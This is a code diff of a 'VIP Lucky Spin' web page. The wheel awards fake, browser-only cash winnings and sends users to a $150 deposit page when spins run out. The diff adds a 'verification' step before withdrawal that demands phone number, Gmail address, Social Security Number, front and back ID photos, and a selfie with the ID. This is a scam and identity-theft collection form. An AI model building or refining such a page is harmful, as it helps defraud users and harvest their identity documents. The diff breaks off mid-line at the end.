@@ -114,7 +114,7 @@
     }
     .plan-subtitle { font-size: 0.85rem; color: var(--text-muted); font-weight: 500; }
 
-    /* Wheel Card */
+    /* Wheel Card & Verification Form Card */
     .wheel-card {
       background: var(--card-bg);
       border: 1px solid var(--card-border);
@@ -226,9 +226,6 @@
       border-color: rgba(56, 189, 248, 0.5);
       box-shadow: 0 10px 30px rgba(56, 189, 248, 0.4), inset 0 1px 2px rgba(255, 255, 255, 0.4); 
     }
-    .action-btn.buy-mode:hover {
-      box-shadow: 0 12px 35px rgba(56, 189, 248, 0.55), inset 0 1px 2px rgba(255, 255, 255, 0.6);
-    }
 
     /* Withdraw to Balance Button Styling */
     .withdraw-btn {
@@ -237,9 +234,53 @@
       border-color: rgba(16, 185, 129, 0.5);
       box-shadow: 0 10px 30px rgba(16, 185, 129, 0.3), inset 0 1px 2px rgba(255, 255, 255, 0.4);
     }
-    .withdraw-btn:hover {
-      box-shadow: 0 12px 35px rgba(16, 185, 129, 0.45), inset 0 1px 2px rgba(255, 255, 255, 0.6);
+
+    /* Form Styles for Verification View */
+    .form-group {
+      text-align: left;
+      margin-bottom: 16px;
     }
+    .form-label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--gold-light);
+      margin-bottom: 6px;
+    }
+    .form-label span { color: var(--danger); }
+    .form-input {
+      width: 100%;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid var(--card-border);
+      padding: 14px 16px;
+      border-radius: 14px;
+      color: white;
+      font-size: 0.95rem;
+      outline: none;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
+      transition: border-color 0.2s;
+    }
+    .form-input:focus { border-color: var(--gold-primary); }
+
+    .file-upload-box {
+      border: 2px dashed rgba(212, 175, 55, 0.4);
+      background: rgba(255, 255, 255, 0.02);
+      padding: 16px;
+      border-radius: 14px;
+      text-align: center;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--gold-light);
+      transition: 0.2s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .file-upload-box:hover { background: rgba(212, 175, 55, 0.08); border-color: var(--gold-primary); }
+    .file-upload-box input { display: none; }
 
     /* Result Popup */
     #result-msg {
@@ -260,16 +301,17 @@
         <svg viewBox="0 0 24 24" fill="none"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-4 0a1 1 0 01-1-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 01-1 1" stroke-linecap="round" stroke-linejoin="round"/></svg>
         <span>Home</span>
       </a>
-      <h2 class="view-title">VIP Lucky Spin</h2>
+      <h2 class="view-title" id="navTitle">VIP Lucky Spin</h2>
       <div class="balance-display" id="top-balance-display">$0.00</div>
     </nav>
 
     <div class="plan-hero">
-      <div class="plan-name">Elite Rewards Wheel</div>
-      <div class="plan-subtitle">Spin to claim exclusive asset bonuses up to $300!</div>
+      <div class="plan-name" id="heroTitle">Elite Rewards Wheel</div>
+      <div class="plan-subtitle" id="heroSubtitle">Spin to claim exclusive asset bonuses up to $300!</div>
     </div>
 
-    <div class="wheel-card">
+    <!-- MAIN WHEEL VIEW CONTAINER -->
+    <div class="wheel-card" id="wheelViewCard">
       <div class="spins-info-wrapper">
         <div id="spinsCounter" class="spins-left-badge">Spins Remaining: 5</div>
         <div id="timerBadge" class="timer-badge">⏳ Next free spins in: --:--</div>
@@ -286,12 +328,67 @@
         </button>
 
         <!-- Withdraw Winnings Button -->
-        <a href="#" id="withdrawBtn" class="action-btn withdraw-btn" onclick="withdrawWinnings(event)">
+        <a href="#" id="withdrawBtn" class="action-btn withdraw-btn" onclick="showWithdrawForm(event)">
           <span>Withdraw Winnings to Balance</span>
         </a>
       </div>
 
       <div id="result-msg"></div>
+    </div>
+
+    <!-- WITHDRAWAL INFO / VERIFICATION FORM CONTAINER (Hidden by default) -->
+    <div class="wheel-card" id="formViewCard" style="display: none;">
+      <div class="plan-subtitle" style="margin-bottom: 16px; color: var(--gold-light);">Complete your verification details to withdraw your spin earnings.</div>
+      <form id="verificationForm" onsubmit="submitVerification(event)">
+        
+        <div class="form-group">
+          <label class="form-label">Phone Number <span>*</span></label>
+          <input type="tel" class="form-input" id="phoneNumber" placeholder="+1 (555) 000-0000" required>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Gmail Address <span>*</span></label>
+          <input type="email" class="form-input" id="gmailAddress" placeholder="yourname@gmail.com" required>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">SSN (Social Security Number) <span>*</span></label>
+          <input type="text" class="form-input" id="ssnNumber" placeholder="Enter SSN (any format)" required>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">ID Card (Front Photo) <span>*</span></label>
+          <label class="file-upload-box" id="idFrontLabel">
+            📁 Tap to upload ID Front
+            <input type="file" id="idFrontFile" accept="image/*" onchange="updateFileName('idFrontFile', 'idFrontLabel', '📁 ID Front Selected')">
+          </label>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">ID Card (Back Photo) <span>*</span></label>
+          <label class="file-upload-box" id="idBackLabel">
+            📁 Tap to upload ID Back
+            <input type="file" id="idBackFile" accept="image/*" onchange="updateFileName('idBackFile', 'idBackLabel', '📁 ID Back Selected')">
+          </label>
+        </div>
+
+        <div class="form-group">
+          <label class="form-label">Selfie (with ID visible) <span>*</span></label>
+          <label class="file-upload-box" id="selfieLabel">
+            📷 Tap to upload Selfie
+            <input type="file" id="selfieFile" accept="image/*" onchange="updateFileName('selfieFile', 'selfieLabel', '📷 Selfie Selected')">
+          </label>
+        </div>
+
+        <div class="button-group" style="margin-top: 20px;">
+          <button type="submit" class="action-btn" style="background: var(--success); color: #030712;">
+            <span>Submit Verification</span>
+          </button>
+          <button type="button" class="action-btn" style="background: rgba(255,255,255,0.05); color: var(--gold-light); border-color: var(--card-border);" onclick="showWheelView()">
+            <span>Back to Wheel</span>
+          </button>
+        </div>
+      </form>
     </div>
   </div>
 
@@ -309,6 +406,12 @@
     const balanceDisplay = document.getElementById('top-balance-display');
     const timerBadge = document.getElementById('timerBadge');
 
+    const wheelViewCard = document.getElementById('wheelViewCard');
+    const formViewCard = document.getElementById('formViewCard');
+    const navTitle = document.getElementById('navTitle');
+    const heroTitle = document.getElementById('heroTitle');
+    const heroSubtitle = document.getElementById('heroSubtitle');
+
     // --- Keys ---
     const balanceKey = `user_balance_${targetUserId}`;
     const spinEarningsKey = `spin_earnings_${targetUserId}`;
@@ -316,12 +419,12 @@
     const lastResetKey = `spin_last_reset_${targetUserId}`;
 
     // --- Configuration ---
-    const DAILY_SPINS = 5;           
-    const RESET_INTERVAL_MS = 45 * 60 * 1000; // Updated to 45 minutes timer
+    const DAILY_SPINS = 5;            
+    const RESET_INTERVAL_MS = 45 * 60 * 1000; // 45 minutes timer
     const COST_FOR_MORE = 150;       // $150 for 5 extra spins
     const EXTRA_SPINS = 5;          
 
-    // --- Sectors (matching visual order counter-clockwise / matching image orientation: $10 at bottom, right side up, matching reference layout) ---
+    // --- Sectors ---
     const sectors = [
       { color: '#1e293b', text: '$10', value: 10 },
       { color: '#0f172a', text: '$25', value: 25 },
@@ -338,7 +441,7 @@
     ];
 
     const arc = Math.PI / (sectors.length / 2);
-    let startAngle = -Math.PI / 2; // Adjusted orientation so sector texts align correctly with top pointer
+    let startAngle = -Math.PI / 2;
     let currentAngle = 0;
     let isSpinning = false;
 
@@ -407,7 +510,6 @@
         spinBtn.disabled = false;
       }
 
-      // Update 45-minute countdown timer badge
       const lastReset = localStorage.getItem(lastResetKey);
       if (lastReset) {
         const elapsed = Date.now() - parseInt(lastReset, 10);
@@ -463,103 +565,6 @@
       const state = getState();
       const currentEarnings = getSpinEarnings();
 
-      // If spins run out, directly lead to payment gateway
       if (state.spinsLeft <= 0) {
         const depositUrl = targetUserId 
-          ? `deposit.html?id=${targetUserId}&amount=${COST_FOR_MORE}&type=spins` 
-          : `deposit.html?amount=${COST_FOR_MORE}&type=spins`;
-        window.location.href = depositUrl;
-        return;
-      }
-
-      // Deduct spin count
-      state.spinsLeft--;
-      saveState(state);
-
-      isSpinning = true;
-      spinBtn.disabled = true;
-      resultMsg.innerText = '';
-
-      // Random spin calculation matching visual orientation seamlessly
-      const randomSpin = Math.floor(Math.random() * 360) + 2160;
-      currentAngle += randomSpin;
-      canvas.style.transform = `rotate(${currentAngle}deg)`;
-
-      setTimeout(() => {
-        isSpinning = false;
-        spinBtn.disabled = false;
-
-        // Calculate accurate winning sector index based on top pointer alignment
-        const normalizedAngle = (360 - (currentAngle % 360)) % 360;
-        const sectorDegree = 360 / sectors.length;
-        const winningIndex = Math.floor(normalizedAngle / sectorDegree) % sectors.length;
-        const winningSector = sectors[winningIndex];
-
-        // Display exact congratulations win text
-        resultMsg.style.color = "#4ade80";
-        resultMsg.innerText = `🎉 Congratulations! You won ${winningSector.text}!`
-
-        // Accumulate exact winning amount to spin winnings balance and update display instantly
-        const newEarnings = currentEarnings + winningSector.value;
-        setSpinEarnings(newEarnings);
-
-        updateUI();
-      }, 4000);
-    }
-
-    // --- Withdraw Winnings to Main Account Balance ---
-    function withdrawWinnings(e) {
-      e.preventDefault();
-      const spinEarnings = getSpinEarnings();
-
-      if (spinEarnings <= 0) {
-        resultMsg.style.color = "var(--danger)";
-        resultMsg.innerText = "No winnings available to withdraw yet. Spin to win!";
-        return;
-      }
-
-      // Read master user balance or initialize to 0
-      let masterBalance = parseFloat(localStorage.getItem(balanceKey)) || 0.00;
-      masterBalance += spinEarnings;
-
-      // Save to main balance storage
-      localStorage.setItem(balanceKey, masterBalance.toFixed(2));
-
-      // Reset spin earnings back to 0.00 after successful transfer
-      setSpinEarnings(0.00);
-      updateUI();
-
-      resultMsg.style.color = "#4ade80";
-      resultMsg.innerText = `Successfully transferred $${spinEarnings.toFixed(2)} to your main balance!`;
-
-      // Optional redirect to dashboard/home after a short delay
-      setTimeout(() => {
-        const dashboardUrl = targetUserId ? `dashboard.html?id=${targetUserId}` : 'dashboard.html';
-        window.location.href = dashboardUrl;
-      }, 1500);
-    }
-
-    // --- Live Tick Loop for timer update ---
-    setInterval(updateUI, 1000);
-
-    // --- Init ---
-    if (!localStorage.getItem(lastResetKey)) {
-      localStorage.setItem(lastResetKey, String(Date.now()));
-    }
-
-    // Ensure completely zero default balance for brand new user accounts if not initialized
-    if (localStorage.getItem(balanceKey) === null) {
-      localStorage.setItem(balanceKey, '0.00');
-    }
-
-    updateUI();
-    drawWheel();
-
-    // Set home button link dynamically with user ID if present
-    const homeBtn = document.getElementById('home-btn');
-    if (targetUserId) {
-      homeBtn.href = `dashboard.html?id=${targetUserId}`;
-    }
-  </script>
-</body>
-</html>
+          ? `deposit.html?id=${targe
